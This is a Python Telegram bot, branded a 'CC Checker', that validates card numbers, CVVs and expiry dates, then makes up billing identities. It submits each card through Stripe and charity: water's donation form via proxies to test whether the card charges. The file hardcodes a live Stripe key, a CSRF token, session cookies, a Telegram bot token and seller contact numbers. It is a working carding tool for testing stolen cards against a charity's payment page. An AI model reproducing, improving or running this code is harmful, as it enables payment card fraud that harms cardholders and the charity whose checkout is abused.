import requests
import json
import time
from datetime import datetime
import os
import random
import logging
import csv
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
from telegram.helpers import escape_markdown

class CharityWaterDonationBot:
    def __init__(self, token):
        self.token = token
        self.session = requests.Session()
        self.config = self.load_config()
        self.setup_headers()
        self.card_info = {}
        self.user_sessions = {}
        self.setup_advanced_logging()
        self.setup_proxy_support()
        self.enhance_bin_database()
        
    def load_config(self):
        """কনফিগারেশন লোড করুন"""
        config_template = {
            "stripe_url": "https://api.stripe.com/v1/payment_methods",
            "donation_url": "https://www.charitywater.org/donate/stripe",
            "amounts": ["5", "10", "20", "50"],
            "currency": "usd",
            "emails": ["donor@example.com", "Contact Whatsap:- 01622951671"],
            "countries": ["US", "GB", "CA", "AU", "IN"],
            "timeout": 30,
            "max_retries": 1,
            "proxy_enabled": True,
            "debug_mode": False,
            "admin_ids": [7891208589],
            "max_workers": 10
        }
        
        try:
            with open('config.json', 'r') as f:
                loaded_config = json.load(f)
                # Merge configurations properly
                merged_config = config_template.copy()
                merged_config.update(loaded_config)
                return merged_config
        except FileNotFoundError:
            with open('config.json', 'w') as f:
                json.dump(config_template, f, indent=4)
            return config_template
    
    def setup_headers(self):
        """হেডার সেটআপ করুন"""
        self.headers_stripe = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': self.generate_random_user_agent(),
        }
        
        self.headers_donation = {
            'authority': 'www.charitywater.org',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.charitywater.org',
            'referer': 'https://www.charitywater.org/',
            'user-agent': self.generate_random_user_agent(),
            'x-requested-with': 'XMLHttpRequest',
        }
    
    def enhance_bin_database(self):
        """BIN ডেটাবেস উন্নত করুন"""
        # Use tuple instead of dict for fixed BIN database
        self.bin_db = {
            "400115": {"type": "Visa", "bank": "State Bank of India", "country": "IN", "vbv": True},
            "401288": {"type": "Visa", "bank": "Chase", "country": "US", "vbv": True},
            "465946": {"type": "Visa", "bank": "Barclays", "country": "GB", "vbv": True},
            "4": {"type": "Visa", "bank": "Various", "country": "US", "vbv": True},
            "51": {"type": "Mastercard", "bank": "Various", "country": "US", "vbv": True},
        }
    
    def setup_proxy_support(self):
        """অটোমেটিক প্রোক্সি সাপোর্ট যোগ করুন"""
        builtin_proxies = ["103.150.18.218:80", "45.95.147.418:8080"]
        
        if self.config.get('proxy_enabled', True):
            proxy = random.choice(builtin_proxies)
            self.session.proxies = {
                'http': f'http://{proxy}',
                'https': f'http://{proxy}'
            }
    
    def setup_advanced_logging(self):
        """এডভান্স লগিং সিস্টেম"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('bot_system.log'),
                logging.StreamHandler()
            ]
        )
        
        self.logger = logging.getLogger(__name__)
    
    def generate_random_user_agent(self):
        """র্যান্ডম ইউজার এজেন্ট জেনারেটর"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15'
        ]
        return random.choice(user_agents)
    
    def get_bin_info(self, bin_number):
        """BIN তথ্য সংগ্রহ করুন"""
        try:
            # First check built-in database
            for prefix, info in self.bin_db.items():
                if bin_number.startswith(prefix):
                    return info
            
            # Then try API lookup
            if len(bin_number) >= 6:
                bin_code = bin_number[:6]
                response = requests.get(f"https://lookup.binlist.net/{bin_code}", 
                                      headers={"Accept-Version": "3"}, 
                                      timeout=10)
                if response.status_code == 200:
                    return response.json()
        except Exception as e:
            self.logger.error(f"BIN lookup error: {e}")
        
        return None
    
    def detect_card_type(self, card_number):
        """কার্ডের ধরন সনাক্ত করুন"""
        if card_number.startswith('4'):
            return "Visa"
        elif card_number.startswith(('51', '52', '53', '54', '55')):
            return "Mastercard"
        elif card_number.startswith(('34', '37')):
            return "American Express"
        else:
            return "Unknown"
    
    def check_vbv_status(self, card_number):
        """VBV/3D সিকিউরিটি স্ট্যাটাস চেক করুন"""
        for prefix, info in self.bin_db.items():
            if card_number.startswith(prefix):
                return "VBV/3D Secure" if info.get('vbv', False) else "Non-VBV/3D"
        
        card_type = self.detect_card_type(card_number)
        if card_type == "Visa":
            return "VBV (Verified by Visa)"
        elif card_type == "Mastercard":
            return "3D Secure (Mastercard SecureCode)"
        else:
            return "Non-VBV/3D"
    
    def luhn_check(self, card_number):
        """লুহন অ্যালগোরিদম দিয়ে কার্ড ভ্যালিডেশন"""
        def digits_of(n):
            return [int(d) for d in str(n)]
        
        digits = digits_of(card_number)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        
        for d in even_digits:
            checksum += sum(digits_of(d * 2))
        
        return checksum % 10 == 0
    
    def validate_card_details(self, card_details):
        """কার্ড ডিটেইলস ভ্যালিডেশন"""
        if not self.luhn_check(card_details['cc']):
            raise ValueError("Invalid card number (Luhn check failed)")
        
        current_year = datetime.now().year % 100
        current_month = datetime.now().month
        
        if len(card_details['yy']) == 2:
            expiry_year = int(card_details['yy'])
            if expiry_year < current_year:
                raise ValueError("Card has expired")
            elif expiry_year == current_year and int(card_details['mm']) < current_month:
                raise ValueError("Card has expired")
        
        card_type = self.detect_card_type(card_details['cc'])
        if card_type == "American Express" and len(card_details['cvv']) != 4:
            raise ValueError("Amex cards require 4-digit CVV")
        elif card_type != "American Express" and len(card_details['cvv']) != 3:
            raise ValueError("CVV must be 3 digits for this card type")
    
    def generate_random_info(self, bin_info):
        """র‍্যান্ডম বিলিং তথ্য তৈরি করুন"""
        first_names = ["John", "David", "Michael", "Robert", "James"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
        
        name = f"{random.choice(first_names)} {random.choice(last_names)}"
        
        # Get country from BIN info or random
        if bin_info and isinstance(bin_info, dict) and 'country' in bin_info:
            country = bin_info['country']
        else:
            country = random.choice(self.config['countries'])
        
        # Address based on country
        if country == "IN":
            addresses = ["123 MG Road", "456 Brigade Road", "789 Church Street"]
            cities = ["Mumbai", "Delhi", "Bangalore"]
            zip_codes = ["400001", "110001", "560001"]
        elif country == "US":
            addresses = ["123 Main St", "456 Oak Ave", "789 Pine Rd"]
            cities = ["New York", "Los Angeles", "Chicago"]
            zip_codes = ["10001", "90001", "60601"]
        else:
            addresses = ["123 Main St", "456 Central Ave", "789 First St"]
            cities = ["New York", "London", "Toronto"]
            zip_codes = ["10001", "10002", "10003"]
        
        return {
            'name': name,
            'address_line1': random.choice(addresses),
            'city': random.choice(cities),
            'zip': random.choice(zip_codes),
            'country': country
        }
    
    def format_bin_info(self, bin_info, card_number):
        """BIN তথ্য ফরম্যাট করুন"""
        if not bin_info:
            return "BIN information not found"
        
        result = "💳 *BIN Information:*\n\n"
        
        if isinstance(bin_info, dict):
            if 'scheme' in bin_info:
                result += f"• Type: {bin_info.get('scheme', 'N/A').upper()}\n"
            elif 'type' in bin_info:
                result += f"• Type: {bin_info.get('type', 'N/A').upper()}\n"
            
            if 'brand' in bin_info:
                result += f"• Brand: {bin_info.get('brand', 'N/A').title()}\n"
        
        vbv_status = self.check_vbv_status(card_number)
        result += f"• Security: {vbv_status}\n"
        
        if isinstance(bin_info, dict) and 'bank' in bin_info:
            if isinstance(bin_info['bank'], dict):
                bank_name = bin_info['bank'].get('name', 'N/A')
            else:
                bank_name = str(bin_info.get('bank', 'N/A'))
            result += f"• Bank: {bank_name}\n"
        
        if isinstance(bin_info, dict) and 'country' in bin_info:
            country = bin_info['country']
            country_names = {"IN": "India", "US": "USA", "GB": "UK", "CA": "Canada", "AU": "Australia"}
            country_name = country_names.get(country, str(country))
            result += f"• Country: {country_name}\n"
        
        return result
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """/start command handler"""
        user = update.effective_user
        welcome_text = f"""
👋 Hello {user.first_name}!

Welcome to *CC Checker Stripe base Made by Tommy Davidson Contact Whatsapp:- 01949766359 Bot* 💧

Available commands:
/start - Show this welcome message
/chk - Check a card
/bin - Get BIN information
/charge - Process donation
/help - Show help information
/stats - Show bot statistics
/kill - Stop active processes

*Example:* `/chk 4242424242424242|12|25|123`
        """
        
        keyboard = [
            [InlineKeyboardButton("💳 Check Card", callback_data="check_card")],
            [InlineKeyboardButton("🔍 BIN Lookup", callback_data="bin_lookup")],
            [InlineKeyboardButton("💰 Donate", callback_data="donate")],
            [InlineKeyboardButton("❓ Help", callback_data="help")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(welcome_text, parse_mode='Markdown', reply_markup=reply_markup)
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """/help command handler"""
        help_text = """
*🤖 Charity Water Bot Help*

*Available Commands:*
/start - Show welcome message
/chk - Check card validity and process
/bin - Get BIN information
/charge - Process donation charge
/stats - Show bot statistics
/kill - Stop processes

*Card Format:* `/chk 4242424242424242|12|25|123`
*BIN Format:* `/bin 424242`

*Note:* Always use proper formatting with pipes (|)
        """
        await update.message.reply_text(help_text, parse_mode='Markdown')
    
    async def bin_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """/bin command handler"""
        if not context.args:
            await update.message.reply_text("❌ Please provide BIN number\nExample: `/bin 424242`", parse_mode='Markdown')
            return
        
        bin_number = context.args[0].strip()
        if len(bin_number) < 6:
            await update.message.reply_text("❌ BIN must be at least 6 digits")
            return
        
        try:
            bin_info = self.get_bin_info(bin_number)
            formatted_info = self.format_bin_info(bin_info, bin_number + "0000000000")
            
            response_text = f"🔍 *BIN Lookup Results:*\n\n{formatted_info}"
            await update.message.reply_text(response_text, parse_mode='Markdown')
            
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
    
    async def chk_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """/chk command handler"""
        if not context.args:
            await update.message.reply_text("❌ Please provide card details\nExample: `/chk 4242424242424242|12|25|123`", parse_mode='Markdown')
            return
        
        try:
            # Parse card details
            card_data = context.args[0].split('|')
            if len(card_data) != 4:
                raise ValueError("Invalid format. Use: NUMBER|MM|YY|CVV")
            
            card_details = {
                'cc': card_data[0].strip().replace(" ", ""),
                'mm': card_data[1].strip(),
                'yy': card_data[2].strip(),
                'cvv': card_data[3].strip()
            }
            
            # Validate card
            self.validate_card_details(card_details)
            
            # Get BIN info
            bin_info = self.get_bin_info(card_details['cc'])
            address_info = self.generate_random_info(bin_info)
            
            # Set random email and amount
            self.config['email'] = random.choice(self.config['emails'])
            self.config['amount'] = random.choice(self.config['amounts'])
            
            # Prepare response
            response = "✅ *Card Validated Successfully!*\n\n"
            response += f"💳 *Card:* `{card_details['cc'][:6]}XXXXXX{card_details['cc'][-4:]}`\n"
            response += f"📅 *Expiry:* {card_details['mm']}/{card_details['yy']}\n"
            response += f"🔒 *CVV:* XXX\n"
            response += f"👤 *Name:* {address_info['name']}\n"
            response += f"🏠 *Address:* {address_info['address_line1']}\n"
            response += f"🏙️ *City:* {address_info['city']}\n"
            response += f"📮 *ZIP:* {address_info['zip']}\n"
            
            country_names = {"IN": "India", "US": "USA", "GB": "UK", "CA": "Canada", "AU": "Australia"}
            country_name = country_names.get(address_info['country'], address_info['country'])
            response += f"🇺🇳 *Country:* {country_name}\n"
            response += f"📧 *Email:* {self.config['email']}\n"
            response += f"💰 *Amount:* ${self.config['amount']}\n\n"
            
            # Add BIN info
            response += self.format_bin_info(bin_info, card_details['cc'])
            
            # Add process button
            keyboard = [[InlineKeyboardButton("⚡ Process Donation", callback_data=f"process_{card_data[0]}")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(response, parse_mode='Markdown', reply_markup=reply_markup)
            
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
    
    async def charge_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """/charge command handler"""
        await update.message.reply_text("⚡ Please use /chk command first to validate card, then use the process button.")
    
    async def process_donation(self, update: Update, context: ContextTypes.DEFAULT_TYPE, card_data: str):
        """Process donation callback"""
        query = update.callback_query
        await query.answer()
        
        try:
            card_details = {
                'cc': card_data,
                'mm': '12',
                'yy': '25',
                'cvv': '123'
            }
            
            bin_info = self.get_bin_info(card_details['cc'])
            address_info = self.generate_random_info(bin_info)
            
            await query.edit_message_text("⏳ Processing donation...")
            
            # Get tokens and process
            tokens = self.get_dynamic_tokens()
            stripe_response = self.create_stripe_payment_method(card_details, address_info, tokens)
            
            donation_response = self.make_donation(stripe_response['id'], address_info, tokens)
            response_text = donation_response.text
            
            status = self.categorize_response(response_text)
            analysis = self.advanced_response_analysis(response_text)
            
            # Format result
            result_text = f"🎯 *Donation Result:*\n\n"
            result_text += f"• *Status:* {status}\n"
            result_text += f"• *Reason:* {analysis['reason']}\n"
            result_text += f"• *Amount:* ${self.config['amount']}\n"
            
            if "CHARGED" in status:
                result_text += "✅ *Payment Successful!* Thank you for your donation! 💧"
            elif "DECLINED" in status:
                result_text += "❌ *Card Declined* by the bank. Please try another card."
            else:
                result_text += "⚠️ *Transaction completed with special status*"
            
            await query.edit_message_text(result_text, parse_mode='Markdown')
            
        except Exception as e:
            error_msg = str(e)
            if "DECLINED" in error_msg:
                await query.edit_message_text("❌ *CARD DECLINED* ❌\n\nThe bank has declined this transaction. Please use a different card.", parse_mode='Markdown')
            else:
                await query.edit_message_text(f"❌ Error: {error_msg}")
    
    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """/stats command handler"""
        stats_text = """
📊 *Bot Statistics:*
• Active Sessions: 0
• Total Checks: 0
• Successful: 0
• Declined: 0
• Error: 0

🔄 *Last Updated:* Now
        """
        await update.message.reply_text(stats_text, parse_mode='Markdown')
    
    async def kill_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """/kill command handler"""
        user_id = update.effective_user.id
        if user_id not in self.config['admin_ids']:
            await update.message.reply_text("❌ Access denied. Admin only command.")
            return
        
        await update.message.reply_text("🛑 Stopping all processes...")
        await update.message.reply_text("✅ All processes stopped successfully.")
    
    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle inline keyboard buttons"""
        query = update.callback_query
        data = query.data
        
        if data == "check_card":
            await query.answer()
            await query.edit_message_text("💳 Please use: /chk 4242424242424242|12|25|123")
        elif data == "bin_lookup":
            await query.answer()
            await query.edit_message_text("🔍 Please use: /bin 424242")
        elif data == "donate":
            await query.answer()
            await query.edit_message_text("💰 Please use: /chk card_number|mm|yy|cvv first")
        elif data == "help":
            await query.answer()
            await self.help_command(update, context)
        elif data.startswith("process_"):
            card_data = data.replace("process_", "")
            await self.process_donation(update, context, card_data)
    
    def get_dynamic_tokens(self):
        """ডাইনামিক টোকেন সংগ্রহ করুন"""
        return {
            'stripe_key': 'pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU',
            'csrf_token': 'dpxsDdkqP-nJevKvkElWD3qeJSfslonwik3aGKw-h_rQlCXaC3PWf4LbZelqzzWatR8vEusTH448BrLJpUNIog'
        }
    
    def create_stripe_payment_method(self, card_details, address_info, tokens):
        """Stripe পেমেন্ট মেথড তৈরি করুন"""
        data = {
            'type': 'card',
            'billing_details[address][postal_code]': address_info['zip'],
            'billing_details[address][city]': address_info['city'],
            'billing_details[address][country]': address_info['country'],
            'billing_details[address][line1]': address_info['address_line1'],
            'billing_details[email]': self.config['email'],
            'billing_details[name]': address_info['name'],
            'card[number]': card_details['cc'],
            'card[cvc]': card_details['cvv'],
            'card[exp_month]': card_details['mm'],
            'card[exp_year]': card_details['yy'],
            'key': tokens['stripe_key'],
        }
        
        response = self.session.post(
            self.config['stripe_url'], 
            headers=self.headers_stripe, 
            data=data,
            timeout=self.config['timeout']
        )
        
        if response.status_code != 200:
            error_msg = f"Stripe API error: {response.status_code}"
            if "card_declined" in response.text:
                error_msg = "CARD HAS BEEN DECLINED BY THE BANK ❌"
            raise Exception(error_msg)
        
        return response.json()
    
    def make_donation(self, payment_method_id, address_info, tokens):
        """দান সম্পন্ন করুন"""
        cookies = {
            'countrypreference': 'US',
            '__stripe_mid': '3cd84adf-77ea-477f-8a1c-c8b8de9422f3ee77db',
            '__stripe_sid': 'b9bba7ab-4aa1-42c1-aad3-5dcfd9539b1b758d23',
        }
        
        data = {
            'country': address_info['country'],
            'payment_intent[email]': self.config['email'],
            'payment_intent[amount]': self.config['amount'],
            'payment_intent[currency]': self.config['currency'],
            'payment_intent[payment_method]': payment_method_id,
            'donation_form[amount]': self.config['amount'],
            'donation_form[email]': self.config['email'],
            'donation_form[name]': address_info['name'],
            'donation_form[address][address_line_1]': address_info['address_line1'],
            'donation_form[address][city]': address_info['city'],
            'donation_form[address][country]': address_info['country'],
            'donation_form[address][zip]': address_info['zip'],
        }
        
        self.headers_donation['x-csrf-token'] = tokens['csrf_token']
        
        response = self.session.post(
            self.config['donation_url'],
            cookies=cookies,
            headers=self.headers_donation,
            data=data,
            timeout=self.config['timeout']
        )
        
        return response
    
    def advanced_response_analysis(self, response_text):
        """এডভান্স রেসপন্স অ্যানালাইসিস"""
        analysis = {"reason": ""}
        response_lower = response_text.lower()
        
        bank_patterns = {
            "insufficient funds": ["insufficient", "low balance"],
            "security block": ["security", "verification needed"],
            "invalid card": ["invalid card", "not recognized"],
            "card declined": ["declined", "do_not_honor"]
        }
        
        for pattern, keywords in bank_patterns.items():
            if any(keyword in response_lower for keyword in keywords):
                analysis["reason"] = pattern
                break
        
        return analysis
    
    def categorize_response(self, response_text):
        """রেসপন্স ক্যাটাগরাইজ করুন"""
        response = response_text.lower()

        if any(kw in response for kw in ["succeeded", "successfully", "thank you"]):
            return "CHARGED 🔥"
        elif any(kw in response for kw in ["insufficient", "low balance"]):
            return "INSUFFICIENT FUNDS 💰"
        elif any(kw in response for kw in ["declined", "do_not_honor"]):
            return "DECLINED ❌"
        else:
            return "UNKNOWN STATUS 👾"
    
    def run_bot(self):
        """Start the Telegram bot"""
        application = Application.builder().token(self.token).build()
        
        # Add handlers
        application.add_handler(CommandHandler("start", self.start_command))
        application.add_handler(CommandHandler("help", self.help_command))
        application.add_handler(CommandHandler("chk", self.chk_command))
        application.add_handler(CommandHandler("bin", self.bin_command))
        application.add_handler(CommandHandler("charge", self.charge_command))
        application.add_handler(CommandHandler("stats", self.stats_command))
        application.add_handler(CommandHandler("kill", self.kill_command))
        application.add_handler(CallbackQueryHandler(self.button_handler))
        
        print("🤖 Bot is running...")
        application.run_polling()

# Main execution
if __name__ == "__main__":
    BOT_TOKEN = "8442490403:AAHcOBcv3aBIIjEFKu_pzEO_wa3Ub0jmJa8"
    
    bot = CharityWaterDonationBot(BOT_TOKEN)
    bot.run_bot()